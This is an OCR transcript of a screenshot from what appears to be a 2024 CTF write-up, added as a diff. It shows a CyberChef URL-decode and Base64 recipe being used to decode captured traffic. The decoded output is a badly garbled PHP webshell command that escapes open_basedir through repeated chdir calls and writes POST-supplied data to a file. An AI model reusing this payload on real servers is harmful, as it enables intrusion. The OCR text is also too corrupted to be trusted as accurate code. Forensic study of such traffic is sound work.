@@ -1,0 +1,37 @@
+# OCR: 13e34a3f873ad5e5d5292284979151eb.jpg
+# 来源: .\02-WriteUp\2024\13e34a3f873ad5e5d5292284979151eb.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:23
+
+Recipe
+URL Decode
+From Base64
+E
+A-Za-20-9+/=
+District mode
+ami
+ou
+ou
+[Bd Remove non-alphabet chars
+Input 十 口 口 目 西
+nntttppliorrazcpeiepJoen tn nktooenuainioveniinfoupe nnpoaiita
+rjepewrinret niitttiurecececseiscrurpmcouranipenuecsteetneetaumettcue
+LnieweaepjosuunirooloupescupoeeiratdinJeueodirCatnanioseniieoiecoedr
+acuisayoatrtaupogenacietfounrmaedmeaeeartaipinapaeinlntonnnoee
+nuucpuunalaganairtauee raaetinJogpootfectioouetaiepineerceneteeoats
+pennnpa0pepuenpnos cns0isind rieoepepottpiSoiatcpuotececon
+cComponoeemoanol.niuneopoepmi nri0PetypeotfomeeisesteuorCotreseigen
+PicipzapcJJopucpopt epootiuttpuRooeicotnpusfootucicoioioeauao
+str_replace (X22¥5cnk22%20X22%22K2CX24c )XSBX2AbuFEIOALDADIAGE For (R2AIKIDLIBAZAINIC tren (R24c)RIBB2ANZBEIOZ)NZADUF ADU
+decode (422425822. subste(24c%2C%24152C2) )X3Bacho XA@furi te Fopen (X2442C%220%22 )S2CADADUF)XBFR221X2ISAX22ON22 )XIEXIEX
+‘ocatch(Excepton20%2Ae )R7BechoX2OK22ERRORXIAK2FAIFA22. A24e-RIEgetHessage( )XIBX7DRIBasoutput )RIBdLe( RI
+=o Fa Tria ote eu
+Output 日 口 四 5
+Gini_set(“display errors”, i n limit (@);Sopdir=@ini_get("open_basedir”);if (Sopdir)
+{Soparr=preg_split("/\\\\I\//" Sopdir) ;Socudadirnane($_SERVER[ SCRIPT_FILENAME”); Stmdir=".cee6705bc”sGakdin(Stadir) s@ch
+ir($tadir);Gini_set(“open_basedir",”..");for($i=0;$1<sizeoF (Soparr);$i++)
+{@chdir("..");}In4_set(“open_basedir”,"/"):@rmdir(Socud."/*.$tdir););Function asenc(Sout){return Sout;); Function
+‘asoutput(){Soutput-ob_get_contents();0b_end_clean() jecho "38e452"."26bFdc" echo gasenc(Soutput) echo
+“ba27™."2419d" ;)ob_start();try($F-base64 _decode(substr($_POST["odbdc7ea2574c3"],2));8¢-$ POST["@b3eab3b32600F"];$c~str_e
+eplace("\n","",$c) $cestr_rephace("\n","=,$c);Sbuf=""; for($i=0;$i<strien(Sc);$i+=2)Sbuf curldecode("".substr(S¢,$1,2));,
+E }catch(Exception $e){echo "ERROR: //*.Se->getMessage( );}:asoutput();die():
